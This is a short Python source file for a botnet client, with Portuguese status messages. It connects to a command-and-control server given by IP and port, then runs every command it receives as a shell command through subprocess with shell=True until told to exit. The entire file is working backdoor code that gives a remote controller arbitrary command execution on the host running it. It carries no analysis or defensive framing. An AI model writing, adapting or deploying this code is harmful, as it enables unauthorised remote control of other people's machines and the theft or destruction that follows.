import socket
import subprocess

def bot(server_ip, server_port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, server_port))
        print(f"Conectado ao servidor de C&C: {server_ip}:{server_port}")
        try:
            while True:
                command = s.recv(1024).decode()
                if command.lower() == "exit":
                    break
                if command:
                    print(f"Executando comando: {command}")
                    subprocess.Popen(command, shell=True)
        finally:
            print("Desconectado do servidor de C&C")